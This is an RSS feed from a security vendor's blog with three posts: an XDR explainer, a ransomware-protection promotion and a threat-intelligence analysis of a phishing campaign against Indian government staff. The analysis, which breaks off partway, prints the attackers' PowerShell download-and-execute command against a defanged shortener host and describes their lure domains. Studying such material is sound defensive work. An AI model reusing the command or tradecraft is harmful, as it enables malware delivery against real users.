{"?xml":{"@version":"1.0","@encoding":"UTF-8"},"rss":{"@version":"2.0","@xmlns:content":"http://purl.org/rss/1.0/modules/content/","@xmlns:wfw":"http://wellformedweb.org/CommentAPI/","@xmlns:dc":"http://purl.org/dc/elements/1.1/","@xmlns:atom":"http://www.w3.org/2005/Atom","@xmlns:sy":"http://purl.org/rss/1.0/modules/syndication/","@xmlns:slash":"http://purl.org/rss/1.0/modules/slash/","channel":{"title":"Blogs on Information Technology, Network & Cybersecurity | Seqrite","atom:link":{"@href":"https://www.seqrite.com/blog/feed/","@rel":"self","@type":"application/rss+xml"},"link":"https://www.seqrite.com/blog","description":"","lastBuildDate":"Thu, 18 Jan 2024 12:12:50 +0000","language":"en-US","sy:updatePeriod":"hourly","sy:updateFrequency":"1","item":[{"title":"All About XDR and Its Many Capabilities","link":"https://www.seqrite.com/blog/what-is-xdr-xdr-and-its-many-capabilities/","comments":"https://www.seqrite.com/blog/what-is-xdr-xdr-and-its-many-capabilities/#respond","pubDate":"Thu, 18 Jan 2024 06:41:55 +0000","dc:creator":{"#cdata-section":"Jyotii Karlekar"},"author":"Jyotii Karlekar","category":[{"#cdata-section":"Cybersecurity"},{"#cdata-section":"Enterprise Security"},{"#cdata-section":"Security"},{"#cdata-section":"Seqrite Services"},{"#cdata-section":"XDR and EDR"},{"#cdata-section":"#XDRplatform"},{"#cdata-section":"#XDRsecurity"},{"#cdata-section":"#XDRsolution"}],"guid":{"@isPermaLink":"false","#text":"https://www.seqrite.com/blog/?p=6024"},"img":"https://www.seqrite.com/blog/wp-content/uploads/2024/01/What-is-XDR-XDRvsEDRvsMDR-230x168.png","description":{"#cdata-section":"<p>What is XDR? Let us understand what is XDR, also called as Extended Detection and Response.  XDR is a cybersecurity solution that goes beyond traditional security measures by unifying threat data from various sources within an organization&#8217;s IT ecosystem. XDR provides enhanced visibility and context into advanced threats by collecting and correlating data from email, [&#8230;]</p>\n<p>The post <a rel=\"follow\" href=\"https://www.seqrite.com/blog/what-is-xdr-xdr-and-its-many-capabilities/\" data-wpel-link=\"internal\" target=\"_self\">All About XDR and Its Many Capabilities</a> appeared first on <a rel=\"follow\" href=\"https://www.seqrite.com/blog\" data-wpel-link=\"internal\" target=\"_self\">Blogs on Information Technology, Network &amp; Cybersecurity | Seqrite</a>.</p>\n"},"content:encoded":{"#cdata-section":"<span class=\"rt-reading-time\" style=\"display: block;\"><span class=\"rt-label\">Estimated reading time: </span><span class=\"rt-time\">4</span><span class=\"rt-label\"> minutes</span></span><h2>What is XDR?</h2>\n<p>Let us understand what is XDR, also called as Extended Detection and Response.  XDR is a cybersecurity solution that goes beyond traditional security measures by unifying threat data from various sources within an organization&#8217;s IT ecosystem. <a href=\"https://www.seqrite.com/hawkk/seqrite-hawkkhunt\" data-wpel-link=\"internal\" target=\"_self\" rel=\"follow\">XDR</a> provides enhanced visibility and context into advanced threats by collecting and correlating data from email, endpoints, servers, cloud workloads, and networks. This comprehensive approach allows security teams to analyse, prioritize, hunt, and remediate threats more effectively, reducing the severity and scope of potential attacks.</p>\n<p>XDR leverages advanced analytics and automation to detect and respond to both known and emerging threats. By employing machine learning algorithms and behaviour anomaly detection, XDR can identify suspicious activities that may indicate a cybersecurity incident. This proactive approach enables organizations to mitigate risks and immediately prevent data loss and security breaches.</p>\n<h2>How does XDR work?</h2>\n<p>XDR employs automation for broad visibility, providing context to understand threats efficiently.</p>\n<p><strong>Data Collection and Integration: </strong>Monitors data across an enterprise&#8217;s tech environment, identifying incidents and threats from endpoints to the cloud. Optimizes security alerts by collating related occurrences.</p>\n<p><strong>Unified Analytics: </strong>Automates analysis of correlated incidents, enabling swift response and remediation. AI (Artificial Intelligence) and machine learning analyse data points in real-time, outpacing manual efforts in identifying attacks and malicious behaviour.</p>\n<p><strong>Incident Response: </strong>Allows automated or manual responses to threats. Utilizes preset conditions for actions like device quarantine and threat remediation. Security analysts review incident reports, recommend solutions, and take appropriate actions.</p>\n<h2>Use Cases of XDR</h2>\n<ul>\n<li>Identify endpoint vulnerabilities for proactive defence.</li>\n<li>Hunt threats across diverse domains for comprehensive security.</li>\n<li>Investigate and respond swiftly to security events.</li>\n<li>Conduct health checks on endpoint devices for a robust defence.</li>\n<li>Predict and pre-emptively address potential future cyber-attacks.</li>\n<li>Prioritize and correlate alerts for efficient incident response.</li>\n<li>Responding and remediating incidents automatically and comprehensively, without user intervention</li>\n</ul>\n<h2>Benefits of XDR</h2>\n<p>XDR offers multiple benefits to enterprises, giving them holistic, flexible, and efficient protection against threats.</p>\n<ul>\n<li><strong>Increased Visibility: </strong>XDR enhances security visibility by integrating data from various sources, providing a comprehensive view of the enterprise&#8217;s security landscape. This broadens threat awareness, establishes connections between alerts and incidents, and streamlines analyst efforts.</li>\n<li><strong>Alert Management: </strong>XDR minimizes manual investigation time for analysts by correlating alerts, streamlining notifications, and reducing inbox noise. The system&#8217;s collation of related alerts enhances efficiency and offers a more comprehensive incident overview.</li>\n<li><strong>Incident Prioritization: </strong>XDR assesses incidents, assigning weights to prioritize remediation. It recommends actions aligned with industry standards, regulatory requirements, or customized enterprise criteria.</li>\n<li><strong>Automated Tasks: </strong>XDR features automation tools that reduce analyst workload by handling repetitive tasks.</li>\n<li><strong>Increased Efficiency: </strong>Centralized management tools in XDR enhance alert accuracy and simplify the analyst&#8217;s task by consolidating threat assessment solutions.</li>\n<li><strong>Real-time Threat Detection: </strong>XDR identifies threats in real-time and swiftly deploys automated remediations, minimizing an attacker&#8217;s access to enterprise data and systems.</li>\n<li><strong>Integrated Response: </strong>XDR ensures a cohesive response across multiple security tools by remediating threats across all enterprise security products. It provides centralized analytics, response, and remediation capabilities.</li>\n</ul>\n<h2>EDR vs. XDR: What is the Difference?</h2>\n<p>While <a href=\"https://www.seqrite.com/endpoint-security/seqrite-endpoint-security-cloud\" data-wpel-link=\"internal\" target=\"_self\" rel=\"follow\">EDR</a> and XDR are designed to enhance an organization&#8217;s security posture, they differ in focus, coverage, and capabilities. Here are some key differences between EDR and XDR:</p>\n<ol>\n<li><strong>Scope</strong>: EDR focuses primarily on endpoint security, providing visibility and protection for individual devices within the network. In contrast, XDR takes a broader approach by integrating data from multiple security layers, including endpoints, networks, clouds, and applications.</li>\n<li><strong>Coverage</strong>: EDR solutions are limited to monitoring and protecting endpoints, while XDR provides a more comprehensive view of the entire infrastructure, delivering cross-control-point protection and visibility.</li>\n<li><strong>Data Analysis and Correlation</strong>: EDR primarily analyses endpoint data, while XDR collects and correlates data from multiple sources to provide a unified view of the organization&#8217;s security landscape.</li>\n<li><strong>Automation and Orchestration</strong>: XDR typically offers more advanced automation and orchestration capabilities, enabling security teams to respond quickly and effectively to threats across multiple environments.</li>\n<li><strong>Threat Hunting and Investigation</strong>: XDR solutions often provide enhanced threat hunting and investigation capabilities, allowing security teams to proactively search for potential threats and conduct in-depth investigations to understand the full scope of an incident.</li>\n</ol>\n<h2>EDR vs MDR vs XDR</h2>\n<p>Although XDR, EDR, and <a href=\"https://www.seqrite.com/hawkk/seqrite-hawkkwatch-mdr\" data-wpel-link=\"internal\" target=\"_self\" rel=\"follow\">MDR</a> use advanced analytics for threat detection, they differ in terms of scope. While EDR solutions only provide endpoint protection by monitoring endpoints, such as laptops, desktops, and servers, for signs of a security breach, MDR solutions offer a broader scope of protection by monitoring threats across multiple endpoints, networks, cloud environments, and other data sources. And XDR solutions extend beyond MDR&#8217;s scope as they integrate data across different security silos, delivering broader visibility and more precise incident response actions across different security domains.</p>\n<h2>SEQRITE XDR solution</h2>\n<p><a href=\"https://www.seqrite.com/\" data-wpel-link=\"internal\" target=\"_self\" rel=\"follow\">SEQRITE</a> XDR is a comprehensive incident response tool that integrates data from various security products, providing unified protection against cyberattacks. Through analytics and automation, it centralizes, normalizes, and correlates data in real time, enhancing security processes. <a href=\"https://www.seqrite.com/hawkk/seqrite-hawkkhunt\" data-wpel-link=\"internal\" target=\"_self\" rel=\"follow\">SEQRITE XDR</a> blocks cyber threats by detecting and shutting down malicious encryption processes before they can disrupt the network.</p>\n<h2>Frequently Asked Questions About XDR</h2>\n<h3>What is XDR?</h3>\n<p>Gartner defines XDR as a &#8220;unified security incident detection and response platform that automatically collects and correlates data from multiple proprietary security components.</p>\n<h3>What is the Difference Between XDR vs. SIEM?</h3>\n<p>XDR is like an upgraded security system compared to SIEM. While SIEM looks at network logs, XDR checks a broader range of data like endpoints, network traffic, and the cloud. XDR gives a better picture of security and can spot and handle threats more effectively using advanced tools.</p>\n<h3>What is the difference between XDR and MDR (Managed Detection and Response)?</h3>\n<p>MDR outsources network security responsibilities to experts for threat detection and response, whereas XDR places the management responsibility on the implementing organization. MDR uses XDR systems.</p>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n<p>The post <a rel=\"follow\" href=\"https://www.seqrite.com/blog/what-is-xdr-xdr-and-its-many-capabilities/\" data-wpel-link=\"internal\" target=\"_self\">All About XDR and Its Many Capabilities</a> appeared first on <a rel=\"follow\" href=\"https://www.seqrite.com/blog\" data-wpel-link=\"internal\" target=\"_self\">Blogs on Information Technology, Network &amp; Cybersecurity | Seqrite</a>.</p>\n"},"wfw:commentRss":"https://www.seqrite.com/blog/what-is-xdr-xdr-and-its-many-capabilities/feed/","slash:comments":"0","commentcount":"0"},{"title":"How To Prevent Remote Ransomware: The Easy Way","link":"https://www.seqrite.com/blog/how-to-prevent-remote-ransomware-easy-way/","comments":"https://www.seqrite.com/blog/how-to-prevent-remote-ransomware-easy-way/#respond","pubDate":"Tue, 09 Jan 2024 13:03:32 +0000","dc:creator":{"#cdata-section":"Jyotii Karlekar"},"author":"Jyotii Karlekar","category":[{"#cdata-section":"Ransomware"},{"#cdata-section":"ransomware attack"},{"#cdata-section":"ransomware protection"}],"guid":{"@isPermaLink":"false","#text":"https://www.seqrite.com/blog/?p=6016"},"img":"https://www.seqrite.com/blog/wp-content/uploads/2024/01/SEQRITE-Blog-new-remote-working-1-230x168.png","description":{"#cdata-section":"<p>Ransomware attacks today have become increasingly prevalent and sophisticated. One such alarming trend is the surge in remote ransomware attacks, also known as malicious remote encryption. This attack vector involves using compromised endpoints to encrypt data on other devices within the same network. As per Microsoft Digital Defense Report 2023, around 60% of human-operated ransomware [&#8230;]</p>\n<p>The post <a rel=\"follow\" href=\"https://www.seqrite.com/blog/how-to-prevent-remote-ransomware-easy-way/\" data-wpel-link=\"internal\" target=\"_self\">How To Prevent Remote Ransomware: The Easy Way</a> appeared first on <a rel=\"follow\" href=\"https://www.seqrite.com/blog\" data-wpel-link=\"internal\" target=\"_self\">Blogs on Information Technology, Network &amp; Cybersecurity | Seqrite</a>.</p>\n"},"content:encoded":{"#cdata-section":"<span class=\"rt-reading-time\" style=\"display: block;\"><span class=\"rt-label\">Estimated reading time: </span><span class=\"rt-time\">4</span><span class=\"rt-label\"> minutes</span></span><p>Ransomware attacks today have become increasingly prevalent and sophisticated. One such alarming trend is the surge in remote ransomware attacks, also known as malicious remote encryption. This attack vector involves using compromised endpoints to encrypt data on other devices within the same network. As per Microsoft Digital Defense Report 2023, around 60% of human-operated ransomware attacks now involve this method of attack.   In this article, we will explore the concept of remote ransomware in more detail and discuss how <a href=\"https://www.seqrite.com/endpoint-security/seqrite-endpoint-security\" data-wpel-link=\"internal\" target=\"_self\" rel=\"follow\">SEQRITE Endpoint Protection</a> can provide industry-leading protection against this growing threat. We will delve into the reasons why remote ransomware has become so prevalent and examine the unique features of SEQRITE that set it apart from other endpoint security solutions. Additionally, we will highlight the importance of identifying and securing unprotected devices within your network to mitigate the risk of remote ransomware attacks.</p>\n<h2><b>What is Remote Ransomware?</b></h2>\n<p>Remote ransomware, or malicious remote encryption, occurs when attackers compromise an endpoint and use it as a launching pad to encrypt data on other devices within the same network. In traditional ransomware attacks, adversaries often attempt to deploy ransomware directly onto their target machines. However, if their initial attempt is blocked by security technologies, they pivot to alternative methods, such as remote encryption.</p>\n<p>Once attackers successfully infiltrate a system, they can exploit the organization&#8217;s domain architecture to encrypt data on other managed domain-joined machines. All malicious activities, such as ingress, payload execution, and encryption, occur on the compromised machine, eluding modern security stacks. The only indication of compromise is the transfer of documents to and from other machines.</p>\n<p>A noteworthy factor fuelling the prevalence of remote ransomware is its scalability. A single unmanaged or inadequately protected endpoint has the potential to jeopardize an entire organization&#8217;s network through malicious remote encryption, irrespective of whether other devices are protected with advanced endpoint security solutions. This scalability makes remote ransomware attacks highly attractive to adversaries.</p>\n<h2><b>The Prevalence of Remote Ransomware</b></h2>\n<p>The widespread use of remote ransomware is driven by various factors, including its scalability and the wide range of ransomware variants that support this attack vector. Notably, popular ransomware families like Akira, BitPaymer, BlackCat, BlackMatter, Conti, Crytox, DarkSide, Dharma, LockBit, MedusaLocker, Phobos, Royal, Ryuk, and WannaCry all have capabilities for remote malicious encryption.</p>\n<p>Most traditional endpoint security products are ineffective when it comes to combating remote ransomware attacks. These products mostly focus on detecting malicious ransomware files and processes on the protected endpoint. However, in remote encryption attacks, the malicious processes run on the compromised machine, making the endpoint protection blind to the malicious activity.</p>\n<h2><b>Introducing </b><b>SEQRITE </b><b>Endpoint Protection for Ransomware Protection</b></h2>\n<p><a href=\"https://www.seqrite.com/endpoint-security/seqrite-endpoint-security\" data-wpel-link=\"internal\" target=\"_self\" rel=\"follow\">SEQRITE Endpoint Protection</a> offers robust protection against remote ransomware attacks. Unlike other endpoint security solutions that solely rely on detecting malicious files and processes, the SEQRITE Endpoint Protection solution takes a unique approach by analyzing data files for signs of malicious encryption, regardless of where the processes are running. It actively examines the content of all documents as files are read and written to determine if they have been encrypted maliciously. This universal approach sets SEQRITE Endpoint security services apart from its competitors, enabling it to detect and stop all forms of ransomware, including remote malicious encryption and even previously unseen ransomware variants.</p>\n<h2><b>How </b><b>SEQRITE </b><b>Endpoint Protection Detects Malicious Encryption</b> ?</h2>\n<p>Instead of detecting malicious code, it seeks out the rapid encryption of files carried by a single process. This is achieved through the analysis of the file&#8217;s malicious signature. This approach allows it to identify and block ransomware encryption attempts, even when the malicious process is not actively running on the victim&#8217;s device.</p>\n<h3><b>Automatic Quarantine of Malicious Encryption</b></h3>\n<p>When the endpoint security solution detects mass encryption, it automatically starts quarantining the files. For some of the analyzed malware, we do provide remediation as well.</p>\n<h3><b>Blocking Remote Devices</b></h3>\n<p>In a remote ransomware attack, the SEQRITE Endpoint security solution automatically blocks the IPv4 of the remote device attempting to encrypt files on the victim&#8217;s machine. This proactive measure helps prevent the spread of ransomware within the network and effectively neutralizes the attack.</p>\n<h3><b>Protecting the Master Boot Record (MBR)</b></h3>\n<p>SEQRITE Endpoint Protection solution also safeguards the device from ransomware attacks that target the master boot record (MBR), which can prevent the system from starting up. Additionally, it protects against a process attempting to wipe the hard disk, further safeguarding critical data.</p>\n<h2><b>Identifying Unprotected Devices with </b><b>SEQRITE </b><b>MDR</b></h2>\n<p>To ensure comprehensive protection against remote ransomware attacks, it is crucial to identify and secure all devices within your network. <a href=\"https://www.seqrite.com/hawkk/seqrite-hawkkwatch-mdr\" data-wpel-link=\"internal\" target=\"_self\" rel=\"follow\">SEQRITE Managed Detection and Response (MDR)</a> can play a vital role in this process. By monitoring network traffic for suspicious flows, SEQRITE MDR can identify unprotected devices in the network and rogue assets within your environment.</p>\n<h2><b>Conclusion</b></h2>\n<p>Remote ransomware attacks pose a significant threat to organizations of all sizes. With the rise of malicious remote encryption, it is essential to implement robust security measures to protect your valuable data. SEQRITE Endpoint Protection, with its industry-leading technology, offers comprehensive protection against remote ransomware attacks. Its unique approach ensures that organizations can effectively defend against both known and unknown ransomware variants.</p>\n<p>By taking a proactive approach to network security, you can reduce the risk of falling victim to remote ransomware attacks. With SEQRITE Endpoint Protection, you can rest assured that your organization is well-protected against the evolving threat landscape.</p>\n<p>Protect your organization today with SEQRITE Endpoint Protection and stay one step ahead of remote ransomware attackers.</p>\n<p>The post <a rel=\"follow\" href=\"https://www.seqrite.com/blog/how-to-prevent-remote-ransomware-easy-way/\" data-wpel-link=\"internal\" target=\"_self\">How To Prevent Remote Ransomware: The Easy Way</a> appeared first on <a rel=\"follow\" href=\"https://www.seqrite.com/blog\" data-wpel-link=\"internal\" target=\"_self\">Blogs on Information Technology, Network &amp; Cybersecurity | Seqrite</a>.</p>\n"},"wfw:commentRss":"https://www.seqrite.com/blog/how-to-prevent-remote-ransomware-easy-way/feed/","slash:comments":"0","commentcount":"0"},{"title":"Operation RusticWeb targets Indian Govt: From Rust-based malware to Web-service exfiltration","link":"https://www.seqrite.com/blog/operation-rusticweb-targets-indian-govt-from-rust-based-malware-to-web-service-exfiltration/","comments":"https://www.seqrite.com/blog/operation-rusticweb-targets-indian-govt-from-rust-based-malware-to-web-service-exfiltration/#respond","pubDate":"Thu, 21 Dec 2023 14:12:09 +0000","dc:creator":{"#cdata-section":"Sathwik Ram Prakki"},"author":"Sathwik Ram Prakki","category":[{"#cdata-section":"APT"},{"#cdata-section":"Government"},{"#cdata-section":"Spear Phishing"},{"#cdata-section":"#Defence"},{"#cdata-section":"#DSOP"},{"#cdata-section":"#IAS"},{"#cdata-section":"#Operation"},{"#cdata-section":"#OperationRusticWeb"},{"#cdata-section":"#Oshi"},{"#cdata-section":"#Parichay"},{"#cdata-section":"#PowerShell"},{"#cdata-section":"#Rust"},{"#cdata-section":"#RusticWeb"},{"#cdata-section":"AWES"},{"#cdata-section":"India"}],"guid":{"@isPermaLink":"false","#text":"https://www.seqrite.com/blog/?p=5969"},"img":"https://www.seqrite.com/blog/wp-content/uploads/2023/12/SEQRITE-Blog-new-Dec23-3-230x168.png","description":{"#cdata-section":"<p>SEQRITE Labs APT-Team has uncovered a phishing campaign targeting various Indian government personnel since October 2023. We have also identified targeting of both government and private entities in the defence sector over December. New Rust-based payloads and encrypted PowerShell commands have been utilized to exfiltrate confidential documents to a web-based service engine, instead of a dedicated command-and-control (C2) server. With actively [&#8230;]</p>\n<p>The post <a rel=\"follow\" href=\"https://www.seqrite.com/blog/operation-rusticweb-targets-indian-govt-from-rust-based-malware-to-web-service-exfiltration/\" data-wpel-link=\"internal\" target=\"_self\">Operation RusticWeb targets Indian Govt: From Rust-based malware to Web-service exfiltration</a> appeared first on <a rel=\"follow\" href=\"https://www.seqrite.com/blog\" data-wpel-link=\"internal\" target=\"_self\">Blogs on Information Technology, Network &amp; Cybersecurity | Seqrite</a>.</p>\n"},"content:encoded":{"#cdata-section":"<span class=\"rt-reading-time\" style=\"display: block;\"><span class=\"rt-label\">Estimated reading time: </span><span class=\"rt-time\">13</span><span class=\"rt-label\"> minutes</span></span><p>SEQRITE Labs APT-Team has uncovered a phishing campaign targeting various Indian government personnel since October 2023. We have also identified targeting of both government and private entities in the defence sector over December. New Rust-based payloads and encrypted PowerShell commands have been utilized to exfiltrate confidential documents to a web-based service engine, instead of a dedicated command-and-control (C2) server. With actively modifying its arsenal, it has also used fake domains to host malicious payloads and decoy files. Below are few names of domains and sample baits used in this campaign:</p>\n<ul>\n<li>IPR form of Department of Personnel &amp; Training, specific to IAS officers</li>\n<li>Fake domain mimicking Army Welfare Education Society (AWES)</li>\n<li>Stats report of Assam CDR by Kailash Satyarthi Children’s Foundation</li>\n<li>Another fake domain mimicking Parichay, a Government SSO platform</li>\n<li>Nomination form for Defence Services Officers Provident (DSOP) Fund</li>\n<li>Presentation on the quarterly brief of initiatives with the Ministry of Defence</li>\n</ul>\n<p>This campaign is tracked as <b><i>Operation RusticWeb</i></b>, where multiple TTPs overlap with Pakistan-linked APT groups – <a href=\"https://www.seqrite.com/blog/transparent-tribe-apt-actively-lures-indian-army-amidst-increased-targeting-of-educational-institutions/\" data-wpel-link=\"internal\" target=\"_self\" rel=\"follow\">Transparent Tribe</a> (APT36) and <a href=\"https://www.seqrite.com/blog/sidecopys-multi-platform-onslaught-leveraging-winrar-zero-day-and-linux-variant-of-ares-rat/\" data-wpel-link=\"internal\" target=\"_self\" rel=\"follow\">SideCopy</a>. It also has similarities with Operation <a href=\"https://blog.talosintelligence.com/operation-armor-piercer/\" data-wpel-link=\"external\" target=\"_blank\" rel=\"nofollow\">Armor Piercer</a> report released by Cisco in 2021, and the targeting with the ESSA <a href=\"https://www.seqrite.com/blog/new-spear-phishing-campaign-using-army-welfare-education-societys-scholarship-form/\" data-wpel-link=\"internal\" target=\"_self\" rel=\"follow\">scholarship form</a> of AWES was observed by our team back in the same year.</p>\n<p>Threat actors have begun moving from well-known compiled languages to newer ones like Golang, Rust, and Nim. This provides cross-compatibility and also makes detection difficult at the same time. Recent examples of Golang malware analyzed by our team are the Windows-based <a href=\"https://www.seqrite.com/blog/new-warp-malware-drops-modified-stealerium-infostealer/\" data-wpel-link=\"internal\" target=\"_self\" rel=\"follow\">Warp</a> malware <a href=\"https://www.seqrite.com/resources/new-warp-malware-drops-modified-stealerium-infostealer\" data-wpel-link=\"internal\" target=\"_self\" rel=\"follow\">ecosystem</a> that uses a Telegram bot as C2 and a Linux-based stager payload of <a href=\"https://www.seqrite.com/blog/sidecopys-multi-platform-onslaught-leveraging-winrar-zero-day-and-linux-variant-of-ares-rat/\" data-wpel-link=\"internal\" target=\"_self\" rel=\"follow\">Ares RAT</a>. At the same time, various ransomware (RaaS) operators have migrated from Golang to Rust as it provides high-performance encryption and evasion speed while ensuring memory safety.</p>\n<h2><b>Infection Chain 1</b></h2>\n<p>The first infection observed heavily relies on Rust-based payloads that are used for enumerating the file system. A malicious shortcut file starts an infection where a fake domain of AWES is utilized to drop these payloads and exfiltrate data to a file sharing web-service.</p>\n<p><img class=\"wp-image-5970 aligncenter\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig1-300x186.png\" alt=\"\" width=\"613\" height=\"380\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig1-300x186.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig1-768x476.png 768w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig1-1024x635.png 1024w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig1.png 1174w\" sizes=\"(max-width: 613px) 100vw, 613px\" /></p>\n<p style=\"text-align: center\"><i>Fig. 1 – Infection Chain (1)</i></p>\n<p>The attacker targets the victim via spear-phishing leading to an archive file named “<i>IPR_2023-24</i>”. This contains a Windows shortcut file masquerading as a PDF file using a double extension format. The comment name suggests the bait to be a form related to IPR.</p>\n<p><img class=\"alignnone wp-image-5971 aligncenter\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig2-300x298.png\" alt=\"\" width=\"368\" height=\"366\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig2-300x298.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig2-150x150.png 150w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig2-55x55.png 55w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig2-45x45.png 45w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig2.png 390w\" sizes=\"(max-width: 368px) 100vw, 368px\" /></p>\n<p style=\"text-align: center\"><i>Fig. 2 – Malicious Shortcut file</i></p>\n<table>\n<tbody>\n<tr>\n<td></td>\n<td>C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe -ep Bypass -nop -c &#8220;iwr &#8216;hxxps://rb[.]gy/gbfsi&#8217; -OutFile $env:USERPROFILE\\Documents\\file.ps1; &amp; $env:USERPROFILE\\Documents\\file.ps1&#8221;</td>\n</tr>\n</tbody>\n</table>\n<p>Opening this triggers PowerShell to download and execute a script from the <b><i>rb[.]gy</i></b> domain, a free URL shortener. Command-line parameters to bypass the execution policy with no profile are used to download the PS1 script using Invoke-WebRequest.</p>\n<h3><b>Victimology</b></h3>\n<p>Based on the shortened URL, we can check the stats for a number of clicks and the country where the click has originated using their tracker. The campaign went live at the end of September and a lot of activity can be seen in October, with 26.53% of them being from India alone. This doesn’t account for confirmed victimology but gives an overview of the targeted victim.</p>\n<p><img class=\"alignnone wp-image-5972 aligncenter\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig3-254x300.png\" alt=\"\" width=\"482\" height=\"569\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig3-254x300.png 254w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig3.png 745w\" sizes=\"(max-width: 482px) 100vw, 482px\" /></p>\n<p style=\"text-align: center\"><i>Fig. 3 &#8211; Victimology</i></p>\n<h3><b>PowerShell Stage</b></h3>\n<p>The expanded URL points to a domain named <b><i>awesscholarship[.]in</i></b> to fetch and save the PowerShell script <i>(file.ps1)</i> in the <i>Documents</i> folder. Before checking out this script, the domain name looks like a scholarship for “Army Welfare Education Society”. The legitimate domain for this organization is <b><i>scholarship[.]awesindia[.]com</i></b><i>, </i>where similar phishing campaigns have been observed in the past. Opening this fake domain page redirects it to the official AWES page showing an official alert notice as shown below.</p>\n<p><img class=\"alignnone wp-image-5973 aligncenter\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig4-300x170.png\" alt=\"\" width=\"603\" height=\"342\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig4-300x170.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig4-768x436.png 768w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig4-1024x581.png 1024w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig4.png 1199w\" sizes=\"(max-width: 603px) 100vw, 603px\" /></p>\n<p style=\"text-align: center\"><i>Fig. 4 – Official notice of fake website</i></p>\n<p>PowerShell script begins with setting up URL paths for downloading the subsequent stage payloads along with the lure document. Target paths for downloading and uploading files are set up, where three functions are defined primarily for those features.</p>\n<p><img class=\"alignnone wp-image-5974 aligncenter\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig5-300x253.png\" alt=\"\" width=\"513\" height=\"432\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig5-300x253.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig5.png 792w\" sizes=\"(max-width: 513px) 100vw, 513px\" /></p>\n<p style=\"text-align: center\"><i>Fig. 5 – PowerShell script</i></p>\n<p>The X and Y functions are used to log messages to a file and download a file from the given URL to the target path &amp; log it, respectively. The target location is the default <i>Documents</i> directory where a new folder named <i>Downloads</i> is created to drop the decoy PDF file and an archive beside the folder.</p>\n<p><img class=\"alignnone wp-image-5975 aligncenter\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig6-300x132.png\" alt=\"\" width=\"800\" height=\"352\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig6-300x132.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig6-768x338.png 768w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig6-1024x451.png 1024w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig6.png 1359w\" sizes=\"(max-width: 800px) 100vw, 800px\" /></p>\n<p style=\"text-align: center\"><i>Fig. 6 – PowerShell script (contd.)</i></p>\n<p>Once the decoy is opened, the archive file is extracted which contains a single file without any extension. This is renamed to add the EXE extension and executed. Lastly, the Z function is used to upload the log file to server using <i>curl</i> command and then delete the logs recorded.</p>\n<p><img class=\"alignnone wp-image-5976 aligncenter\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig7-300x52.png\" alt=\"\" width=\"671\" height=\"116\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig7-300x52.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig7-768x132.png 768w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig7-1024x176.png 1024w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig7.png 1299w\" sizes=\"(max-width: 671px) 100vw, 671px\" /></p>\n<p style=\"text-align: center\"><i>Fig. 7 – Log file uploaded</i></p>\n<p>Meanwhile, the decoy file opened is a form for a statement of Immovable Property Return where the service is mentioned as ‘<b><i>Indian Administrative Service</i></b>’. Multiple similar forms on various Indian government portals are available in the public domain. However, this blank IPR form is available on DoPT’s (Department of Personnel &amp; Training) <a href=\"https://dopt.gov.in/sites/default/files/BlankIPR.pdf\" data-wpel-link=\"external\" target=\"_blank\" rel=\"nofollow\">website</a> that falls under India’s Ministry of Personnel Public Grievances and Pensions. Note that this is nowhere related to the ESSA – Education scholarship scheme of the Army Personal application form.<br />\n<img class=\"alignnone wp-image-5977 aligncenter\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig8-300x212.png\" alt=\"\" width=\"687\" height=\"485\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig8-300x212.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig8-768x543.png 768w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig8-1024x724.png 1024w\" sizes=\"(max-width: 687px) 100vw, 687px\" /></p>\n<p style=\"text-align: center\"><i>Fig. 8 – Decoy: IPR form for IAS officers (Oct’23)</i></p>\n<h3><b>Downloader: System Check Stage</b></h3>\n<p>The EXE payload turns out to be a Rust-compiled binary that checks basic system information as found in the PDB path – ‘<i>syscheck.pdb</i>’. After demangling the Rust function names using an IDA Pro plugin, we can see a lot of write and command execute functions being called. It retrieves information by using:</p>\n<ul>\n<li>Domain <b><i>ifconfig[.]me</i></b> to fetch the IP address</li>\n<li>A WMIC command to fetch active drives present on the victim system &#8211; “<i>wmic logicaldisk get caption</i>”.</li>\n</ul>\n<p><img class=\"alignnone wp-image-5978 aligncenter\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig9-300x236.png\" alt=\"\" width=\"470\" height=\"370\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/fig9-300x236.png 300w, 